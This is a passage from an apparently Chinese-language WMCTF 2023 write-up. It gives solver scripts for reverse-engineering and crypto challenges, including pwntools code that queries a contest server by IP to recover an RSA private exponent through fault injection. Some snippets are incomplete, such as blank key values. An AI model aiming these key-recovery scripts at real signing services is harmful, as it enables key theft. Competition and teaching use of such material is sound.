</span></span><span class=line><span class=cl>    <span class=n>ecx</span> <span class=o>=</span> <span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>edx</span> <span class=o>=</span> <span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>edx</span> <span class=o>&amp;=</span> <span class=mi>31</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=n>edx</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=n>r8</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>r8</span> <span class=o>-=</span> <span class=n>edx</span>
</span></span><span class=line><span class=cl>    <span class=n>ecx</span> <span class=o>=</span> <span class=p>(</span><span class=n>ecx</span> <span class=o>&gt;&gt;</span> <span class=n>r8</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>|=</span> <span class=n>ecx</span><span class=o>&amp;</span><span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=n>ecx</span> <span class=o>=</span> <span class=n>cnt</span>
</span></span><span class=line><span class=cl>    <span class=n>ecx</span> <span class=o>*=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>ecx</span> <span class=o>=</span> <span class=p>(</span><span class=n>ecx</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>edx</span> <span class=o>=</span> <span class=n>extendKey</span><span class=p>[</span><span class=n>ecx</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=n>edx</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span> <span class=o>==</span> <span class=mh>0x56b19afc</span><span class=p>)</span><span class=c1>#第一组的第一个</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span> <span class=o>==</span> <span class=mh>0x43af236</span><span class=p>)</span><span class=c1>#第一组的第二个</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>s</span><span class=o>.</span><span class=n>check</span><span class=p>()</span> <span class=o>==</span> <span class=n>sat</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>model</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#print(v5)</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl><span class=c1>#[flag0 = 1464681300, flag1 = 1182484272]</span>
</span></span><span class=line><span class=cl><span class=c1>#[flag0 = 811877750, flag1 = 862873966]</span>
</span></span><span class=line><span class=cl><span class=c1>#[flag0 = 1730238768, flag1 = 1967223397]</span>
</span></span><span class=line><span class=cl><span class=c1>#[flag0 = 1098343795, flag1 = 812462881]</span>
</span></span><span class=line><span class=cl><span class=c1>#[flag0 = 559049063, flag1 = 1752449633]</span>
</span></span><span class=line><span class=cl><span class=c1>#[flag0 = 1667974770, flag1 = 1869431345]</span>
</span></span><span class=line><span class=cl><span class=c1>#[flag0 = 1633905485, flag1 = 829583920]</span>
</span></span><span class=line><span class=cl><span class=c1>#[flag0 = 1914787663, flag1 = 1461789053]</span>
</span></span><span class=line><span class=cl><span class=n>flag_f</span> <span class=o>=</span> <span class=p>[</span><span class=mi>1464681300</span><span class=p>,</span><span class=mi>1182484272</span><span class=p>,</span><span class=mi>811877750</span><span class=p>,</span><span class=mi>862873966</span><span class=p>,</span><span class=mi>1730238768</span><span class=p>,</span><span class=mi>1967223397</span><span class=p>,</span><span class=mi>1098343795</span><span class=p>,</span><span class=mi>812462881</span><span class=p>,</span><span class=mi>559049063</span><span class=p>,</span><span class=mi>1752449633</span><span class=p>,</span><span class=mi>1667974770</span><span class=p>,</span><span class=mi>1869431345</span><span class=p>,</span><span class=mi>1633905485</span><span class=p>,</span><span class=mi>829583920</span><span class=p>,</span><span class=mi>1914787663</span><span class=p>,</span><span class=mi>1461789053</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>flag_f</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>flag_f</span><span class=p>[</span><span class=n>i</span><span class=p>])</span><span class=o>.</span><span class=n>decode</span><span class=p>(),</span><span class=n>end</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=cry>Cry</h1><h2 id=signin>signin</h2><p>先是一个跟DASCTF七月赛的一个p^q泄露，剪枝爆破一下就行。</p><p>后面是一个简单的hnp问题。</p><p>r=(b*s)%2^16</p><p>$$b_i<em>s-r_i=k_i</em>2^{16}\mod p\ b_i<em>s</em>2^{-16}-r_i*2^{-16}=k_i\mod p$$</p><p>k是一个496bits，满足hnp</p><h2 id=welcomesigner2>welcomesigner2</h2><p>myfastexp的函数效果如下</p><p>$$先逆向处理d,根据参数j左右分成dl,dr.\ f(j)=(m^{re(dl)} mod n)*(B_{l-j-1}^{re(dr)}\mod n_)\mod n_$$</p><p>其中B数组可以直接算出</p><p>从左往右，如果对应位数为0，那么上面式子的左半部分大小不变，以此来构建等式，逐位得到dr</p><p>Exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># -*- coding utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=c1># @Time : 2023/8/19 18:04</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1># context.log_level=&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>msg</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Welcome_come_to_WMCTF&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>=</span><span class=n>remote</span><span class=p>(</span><span class=s1>&#39;1.13.101.243&#39;</span><span class=p>,</span><span class=mi>28412</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;|</span><span class=se>\t</span><span class=s1>[Q]uit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;g&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;| n = &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>D</span><span class=o>=</span><span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>l</span><span class=o>=</span><span class=mi>1023</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;flag_ciphertext = &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=o>=</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;f&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;bytes, and index:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2,2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;| [+] update: n_ -&gt; &#34;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n_</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#34;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>1023</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;|</span><span class=se>\t</span><span class=s1>[Q]uit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;s&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Where your want to interfere:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39; is &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sig1</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>t1</span><span class=o>=</span><span class=n>sig1</span><span class=o>*</span><span class=n>inverse</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>B</span><span class=p>[</span><span class=n>l</span><span class=o>-</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>],</span><span class=mi>2</span><span class=o>*</span><span class=nb>int</span><span class=p>(</span><span class=n>D</span><span class=p>,</span><span class=mi>2</span><span class=p>),</span><span class=n>n_</span><span class=p>),</span><span class=n>n_</span><span class=p>)</span> <span class=o>%</span><span class=n>n_</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;|</span><span class=se>\t</span><span class=s1>[Q]uit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;s&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Where your want to interfere:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39; is &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sig2</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>t2</span><span class=o>=</span><span class=n>sig2</span><span class=o>*</span><span class=n>inverse</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>B</span><span class=p>[</span><span class=n>l</span><span class=o>-</span><span class=n>i</span><span class=o>-</span><span class=mi>2</span><span class=p>],</span><span class=mi>4</span><span class=o>*</span><span class=nb>int</span><span class=p>(</span><span class=n>D</span><span class=p>,</span><span class=mi>2</span><span class=p>),</span><span class=n>n_</span><span class=p>),</span><span class=n>n_</span><span class=p>)</span> <span class=o>%</span><span class=n>n_</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>t1</span><span class=o>==</span><span class=n>t2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>D</span><span class=o>+=</span><span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>D</span><span class=o>+=</span><span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;111111111111111&#39;</span> <span class=ow>in</span> <span class=n>D</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>D</span><span class=p>)</span><span class=o>&gt;=</span><span class=mi>1020</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>D</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><p>得到密文和d来解密</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>c</span><span class=o>=</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=s1>&#39;2e8afbc4419284fb733a20c7e932feadae5deeb39f0e1d01c57c8109c08eb2020d48616c59d50d1a029a08b7673c9f71&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c2</span><span class=o>=</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=s1>&#39;329a89386fb65ccfd11a7c64349f1d45850a92e7f2e766da0fb07ddb64b0386ce11d7e7803fd4953023deeadf54ad7f7&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>key1</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=n>key2</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>key1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=n>mode</span><span class=o>=</span><span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>enc</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>key2</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=n>mode</span><span class=o>=</span><span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>enc</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>c2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=welcomesigner1>welcomesigner1</h2><p>myfastexp的函数效果如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$$先对d的二进制逆向，根据参数j左右分成dl,dr.\\ f(j)=((m^{dl} mod n) &lt;
</span></span></code></pre></td></tr></table></div></div><p>从左往右，如果对应位数为0，那么上面式子的右半部分大小不变，以此来构建等式，得到dl</p><p>exp参考上题，关键不同代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>l</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>temp</span><span class=o>=</span><span class=nb>pow</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=nb>int</span><span class=p>(</span><span class=n>D</span><span class=p>,</span><span class=mi>2</span><span class=p>),</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>temp1</span><span class=o>=</span><span class=nb>pow</span><span class=p>(</span><span class=n>temp</span><span class=p>,</span><span class=mi>2</span><span class=o>**</span><span class=n>i</span><span class=p>,</span><span class=n>n_</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>temp</span><span class=o>=</span><span class=nb>pow</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=mi>2</span><span class=o>*</span><span class=nb>int</span><span class=p>(</span><span class=n>D</span><span class=p>,</span><span class=mi>2</span><span class=p>),</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>temp2</span><span class=o>=</span><span class=nb>pow</span><span class=p>(</span><span class=n>temp</span><span class=p>,</span><span class=mi>2</span><span class=o>**</span><span class=p>(</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>),</span><span class=n>n_</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;|</span><span class=se>\t</span><span class=s1>[Q]uit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;s&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Where your want to interfere:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39; is &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sig1</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>t1</span><span class=o>=</span><span class=n>sig1</span><span class=o>*</span><span class=n>inverse</span><span class=p>(</span><span class=n>temp1</span><span class=p>,</span><span class=n>n_</span><span class=p>)</span> <span class=o>%</span><span class=n>n_</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(sig1)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;|</span><span class=se>\t</span><span class=s1>[Q]uit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;s&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Where your want to interfere:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39; is &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sig2</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>t2</span><span class=o>=</span><span class=n>sig2</span><span class=o>*</span><span class=n>inverse</span><span class=p>(</span><span class=n>temp2</span><span class=p>,</span><span class=n>n_</span><span class=p>)</span> <span class=o>%</span><span class=n>n_</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>t1</span><span class=o>==</span><span class=n>t2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>D</span><span class=o>+=</span><span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>D</span><span class=o>+=</span><span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;11111111111&#39;</span> <span class=ow>in</span> <span class=n>D</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>D</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>D</span><span class=p>)</span><span class=o>&gt;=</span><span class=mi>1020</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>D</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=badprime>badprime</h2><p>简单的签到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
